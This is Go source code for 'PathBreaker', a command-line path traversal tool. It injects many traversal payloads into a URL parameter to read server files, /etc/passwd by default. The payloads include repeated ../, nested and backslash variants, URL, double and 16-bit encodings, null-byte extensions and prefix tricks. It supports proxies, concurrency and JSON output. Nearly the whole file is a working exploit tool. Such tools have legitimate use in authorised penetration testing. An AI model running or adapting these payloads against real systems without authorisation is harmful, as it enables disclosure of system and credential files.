package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Result holds the outcome of a single path traversal check
type Result struct {
	URL        string `json:"url"`
	StatusCode int    `json:"status_code"`
	Success    bool   `json:"success"`
	Method     string `json:"method"`
}

var (
	myClient   *http.Client
	whitelist  []int
	blackList  []int
	whiteRegex *regexp.Regexp
	blackRegex *regexp.Regexp
	baseURL    string
	appendix   string
	targetFile string

	// CLI flags
	maxDepth    int
	workerCount int
	rateLimit   float64
	jsonOutput  bool

	// Concurrency
	resultChan chan Result
	workChan   chan workItem
	wg         sync.WaitGroup
	rateTicker *time.Ticker
)

type workItem struct {
	fn   checkFunc
	name string
}

func checkResult(resp *http.Response) bool {
	defer resp.Body.Close()

	statusCode := resp.StatusCode

	// Step 1: Check status code against blacklist first
	for _, code := range blackList {
		if statusCode == code {
			return false
		}
	}

	// Step 2: Check response body using regex (always, regardless of whitelist match)
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	bodyString := string(body)

	// Check if body matches blacklisted regex
	if blackRegex != nil && blackRegex.MatchString(bodyString) {
		return false
	}

	// Check if body matches whitelisted regex
	if whiteRegex != nil && whiteRegex.MatchString(bodyString) {
		return true
	}

	// Step 3: Check status code against whitelist
	for _, code := range whitelist {
		if statusCode == code {
			// If no regex filters matched, whitelist status code is a pass
			if whiteRegex == nil {
				return true
			}
		}
	}

	return false
}

func printBanner() {
	fmt.Println(`  ____       _   _     ____                 _
 |  _ \ __ _| |_| |__ | __ ) _ __ ___  __ _| | _____ _ __
 | |_) / _` + "`" + ` | __| '_ \|  _ \| '__/ _ \/ _` + "`" + ` | |/ / _ \ '__|
 |  __/ (_| | |_| | | | |_) | | |  __/ (_| |   <  __/ |
 |_|   \__,_|\__|_| |_|____/|_|  \___|\__,_|_|\_\___|_|
                                                          `)
	fmt.Println("a parameter focused path traversal tool by Cerast Intelligence\n")
}

var checkFunctions = [...]checkFunc{
	checkDirect,
	dotDotSlashScan,
	dot4xSlashScan,
	dotNestedSlashScan,
	dotFlipFlopSlashScan,
	dotDotSlashURLEncodedScan,
	dotDotSlash16bitEncodedScan,
	dotDotSlashDoubleURLEncodedScan,
}

type checkFunc func() (bool, string)

func main() {
	printBanner()

	urlFlag := flag.String("url", "", "URL to fetch (use PATHBREAKER as injection point)")
	proxyFlag := flag.String("proxy", "", "Proxy URL")
	whiteListFlag := flag.String("whitelist", "200", "Comma-separated whitelist of status codes")
	blackListFlag := flag.String("blacklist", "404,500", "Comma-separated blacklist of status codes")
	whiteRegexFlag := flag.String("whiteregex", "", "Regex to match for whitelisting response body")
	blackRegexFlag := flag.String("blackregex", "", "Regex to match for blacklisting response body")
	targetFileFlag := flag.String("targetFile", "etc/passwd", "Target file to extract")
	timeoutFlag := flag.Int("timeout", 10, "HTTP request timeout in seconds")
	depthFlag := flag.Int("depth", 20, "Maximum traversal depth (number of ../ repetitions)")
	workersFlag := flag.Int("t", 10, "Number of concurrent workers")
	rateLimitFlag := flag.Float64("rate", 0, "Max requests per second (0 = unlimited)")
	jsonFlag := flag.Bool("json", false, "Output results as JSON")

	flag.Parse()

	// Validate required flags
	if *urlFlag == "" {
		log.Fatal("Please provide a URL with -url flag (use PATHBREAKER as injection point)")
	}

	maxDepth = *depthFlag
	workerCount = *workersFlag
	rateLimit = *rateLimitFlag
	jsonOutput = *jsonFlag

	// Setup HTTP client
	timeout := time.Duration(*timeoutFlag) * time.Second

	if *proxyFlag == "" {
		if !jsonOutput {
			fmt.Println("[*] Using no proxy")
		}
		myClient = &http.Client{Timeout: timeout}
	} else {
		if !jsonOutput {
			fmt.Println("[+] Using Proxy: " + *proxyFlag)
		}
		proxyURL, err := url.Parse(*proxyFlag)
		if err != nil {
			log.Fatalf("Invalid proxy URL %q: %v", *proxyFlag, err)
		}
		myClient = &http.Client{
			Timeout:   timeout,
			Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)},
		}
	}

	// Parse whitelist
	if *whiteListFlag != "" {
		for _, entry := range strings.Split(*whiteListFlag, ",") {
			entry = strings.TrimSpace(entry)
			i, err := strconv.Atoi(entry)
			if err != nil {
				log.Fatalf("%q is not a valid status code for the whitelist", entry)
			}
			whitelist = append(whitelist, i)
		}
		if !jsonOutput {
			fmt.Printf("[+] Using whitelist: %v\n", whitelist)
		}
	}

	// Parse blacklist
	if *blackListFlag != "" {
		for _, entry := range strings.Split(*blackListFlag, ",") {
			entry = strings.TrimSpace(entry)
			i, err := strconv.Atoi(entry)
			if err != nil {
				log.Fatalf("%q is not a valid status code for the blacklist", entry)
			}
			blackList = append(blackList, i)
		}
		if !jsonOutput {
			fmt.Printf("[+] Using blacklist: %v\n", blackList)
		}
	}

	// Compile regex patterns
	if *whiteRegexFlag != "" {
		var err error
		whiteRegex, err = regexp.Compile(*whiteRegexFlag)
		if err != nil {
			log.Fatalf("Invalid whitelist regex %q: %v", *whiteRegexFlag, err)
		}
		if !jsonOutput {
			fmt.Println("[+] Using Whitelist-Regex: " + *whiteRegexFlag)
		}
	}
	if *blackRegexFlag != "" {
		var err error
		blackRegex, err = regexp.Compile(*blackRegexFlag)
		if err != nil {
			log.Fatalf("Invalid blacklist regex %q: %v", *blackRegexFlag, err)
		}
		if !jsonOutput {
			fmt.Println("[+] Using Blacklist-Regex: " + *blackRegexFlag)
		}
	}

	// Parse URL injection point
	parts := strings.Split(*urlFlag, "PATHBREAKER")
	baseURL = parts[0]
	if len(parts) > 1 {
		appendix = parts[1]
	}
	targetFile = *targetFileFlag

	// Setup rate limiter
	if rateLimit > 0 {
		rateTicker = time.NewTicker(time.Duration(float64(time.Second) / rateLimit))
		defer rateTicker.Stop()
	}

	// Setup result collector
	resultChan = make(chan Result, 100)
	var results []Result
	var resultWg sync.WaitGroup
	resultWg.Add(1)
	go func() {
		defer resultWg.Done()
		for r := range resultChan {
			if r.Success {
				if jsonOutput {
					results = append(results, r)
				} else {
					fmt.Printf("[+] FOUND: %s\n", r.URL)
				}
			}
		}
	}()

	// Run all checks
	runAllChecks()
	runCheckWithNullEncoding()
	preAppendChecks()

	close(resultChan)
	resultWg.Wait()

	// Print JSON output if requested
	if jsonOutput && len(results) > 0 {
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		if err := enc.Encode(results); err != nil {
			log.Fatalf("Failed to encode JSON: %v", err)
		}
	}
}

func doRequest(urlToRequest string) (bool, string) {
	if rateLimit > 0 && rateTicker != nil {
		<-rateTicker.C
	}

	resp, err := myClient.Get(urlToRequest)
	if err != nil {
		if !jsonOutput {
			log.Printf("Request failed for %s: %v", urlToRequest, err)
		}
		return false, urlToRequest
	}
	return checkResult(resp), urlToRequest
}

func checkDirect() (bool, string) {
	reqURL := baseURL + targetFile + appendix
	return doRequest(reqURL)
}

func checkDirectHelper(urlToRequest string) (bool, string) {
	return doRequest(urlToRequest)
}

func recursiveScan(toRepeat string) (bool, string) {
	for i := 1; i <= maxDepth; i++ {
		success, path := checkDirectHelper(baseURL + strings.Repeat(toRepeat, i) + targetFile + appendix)
		if success {
			return success, path
		}
	}
	return false, ""
}

func runAllChecks() {
	for _, checkFunction := range checkFunctions {
		runCheck(checkFunction)
	}
}

func runCheck(fn checkFunc) {
	success, result := fn()
	if success {
		resultChan <- Result{
			URL:     result,
			Success: true,
			Method:  "traversal",
		}
	}
}

func dotDotSlashScan() (bool, string) {
	return recursiveScan("../")
}

func dot4xSlashScan() (bool, string) {
	return recursiveScan("..../")
}

func dotNestedSlashScan() (bool, string) {
	return recursiveScan("....//")
}

func dotFlipFlopSlashScan() (bool, string) {
	return recursiveScan(`..\/`)
}

func dotDotSlashURLEncodedScan() (bool, string) {
	return recursiveScan("%2e%2e%2f")
}

func dotDotSlash16bitEncodedScan() (bool, string) {
	return recursiveScan("%u002e%u002e%u2215")
}

func dotDotSlashDoubleURLEncodedScan() (bool, string) {
	return recursiveScan("%252e%252e%252f")
}

func runCheckWithNullEncoding() {
	tempTarget := targetFile
	potentialEndings := [...]string{".png", ".pdf", ".exe", ".jpg", ".docx", ".jpeg", ".mp3", ".mp4", ".msi", ".txt", ""}
	for _, ending := range potentialEndings {
		targetFile = tempTarget + "%00" + ending
		runAllChecks()
	}
	targetFile = tempTarget
}

func preAppendChecks() {
	tempURL := baseURL
	potentialPreAppends := [...]string{"/", "/./", "~/", `\`, `..\`, "////"}
	for _, preAppend := range potentialPreAppends {
		baseURL = tempURL + preAppend
		runAllChecks()
		runCheckWithNullEncoding()
	}
	baseURL = tempURL
}
